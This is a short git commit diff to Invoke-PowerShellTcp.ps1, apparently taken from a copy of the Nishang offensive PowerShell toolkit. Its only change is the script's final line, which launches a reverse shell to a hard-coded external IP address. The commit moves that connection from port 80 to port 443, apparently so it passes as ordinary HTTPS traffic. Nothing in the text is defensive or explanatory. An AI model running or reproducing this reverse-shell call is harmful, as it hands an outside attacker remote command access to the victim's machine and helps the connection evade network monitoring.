48bb2c879498de83ee131343be4bda6da7781cc2
IAmNewbie <65204733+IAmNewbie99@users.noreply.github.com>
2024-10-31 09:29:37 +0700

    Update Invoke-PowerShellTcp.ps1

--- Invoke-PowerShellTcp.ps1
+++ Invoke-PowerShellTcp.ps1
@@ -125,4 +125,4 @@ https://github.com/samratashok/nishang
     }
 }
 
-Invoke-PowerShellTcp -Reverse -IPAddress 172.104.169.252 -Port 80
+Invoke-PowerShellTcp -Reverse -IPAddress 172.104.169.252 -Port 443
